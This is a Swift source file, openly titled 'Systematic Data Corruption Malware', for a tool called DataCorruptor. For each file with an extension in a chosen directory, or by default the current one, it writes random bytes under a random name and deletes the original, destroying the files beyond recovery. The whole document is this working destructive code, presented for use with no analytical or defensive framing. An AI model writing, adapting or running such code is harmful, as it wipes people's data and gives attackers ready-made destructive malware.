//
//  DataCorruptor.swift
//  Systematic Data Corruption Malware
//

import Foundation
import Darwin

class DataCorruptor {
    
    static func corruptFile(filePath: String, targetSize: Int? = nil) -> Bool {
        let fileURL = URL(fileURLWithPath: filePath)
        
        let bufferSize = targetSize ?? 4096
        var randomData = Data(count: bufferSize)
        randomData.withUnsafeMutableBytes { ptr in
            let bytes = ptr.bindMemory(to: UInt8.self).baseAddress!
            for i in 0..<bufferSize {
                bytes[i] = UInt8.random(in: 0...255)
            }
        }
        
        let randomName = generateRandomName()
        let newFilePath = fileURL.deletingLastPathComponent()
            .appendingPathComponent(randomName)
        
        do {
            try randomData.write(to: newFilePath)
            print("Corrupted: \(filePath) -> \(newFilePath.path)")
        } catch {
            print("Error writing corrupted data: \(error)")
            return false
        }
        
        do {
            try FileManager.default.removeItem(at: fileURL)
            print("Deleted original: \(filePath)")
        } catch {
            print("Error deleting original file: \(error)")
        }
        
        randomData = Data()
        return true
    }
    
    static func corruptDirectory(directoryPath: String) -> Int {
        let fileURL = URL(fileURLWithPath: directoryPath)
        
        var corruptedCount = 0
        let fileManager = FileManager.default
        let allFiles = try? fileManager.contentsOfDirectory(at: fileURL, includingPropertiesForKeys: nil)
        
        guard let files = allFiles else {
            print("No files found in: \(directoryPath)")
            return 0
        }
        
        for fileURL in files {
            let fileName = fileURL.lastPathComponent
            if fileName.hasPrefix(".") || fileName.hasSuffix(".DS_Store") ||
               fileName.hasSuffix(".Spotlight-V100") || fileName.hasSuffix(".fseventsd") {
                continue
            }
            
            if fileURL.pathExtension != "" {
                corruptFile(filePath: fileURL.path)
                corruptedCount += 1
            }
        }
        
        print("Total corrupted files: \(corruptedCount)")
        return corruptedCount
    }
    
    private static func generateRandomName() -> String {
        let randomChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()"
        var randomName = ""
        
        for _ in 0..<12 {
            let randomIndex = Int(arc4random_uniform(32))
            let char = randomChars[randomChars.index(randomChars.startIndex, offsetBy: randomIndex)]
            randomName += String(char)
        }
        
        return randomName
    }
}

func main() {
    print("=== DataCorruptor v1.0 ===")
    print("Systematic Data Corruption Engine")
    print("")
    
    print("Enter target directory path (or press Enter for current directory):")
    if let targetDir = readLine() {
        let directoryPath = targetDir.trimmingCharacters(in: .whitespacesAndNewlines)
        
        if directoryPath.isEmpty {
            let fm = FileManager.default
            print("Using current directory: \(fm.currentDirectoryPath)")
            _ = DataCorruptor.corruptDirectory(directoryPath: fm.currentDirectoryPath)
        } else {
            _ = DataCorruptor.corruptDirectory(directoryPath: directoryPath)
        }
    } else {
        let fm = FileManager.default
        print("Using current directory: \(fm.currentDirectoryPath)")
        _ = DataCorruptor.corruptDirectory(directoryPath: fm.currentDirectoryPath)
    }
    
    print("")
    print("=== Corruption Complete ===")
}

main()
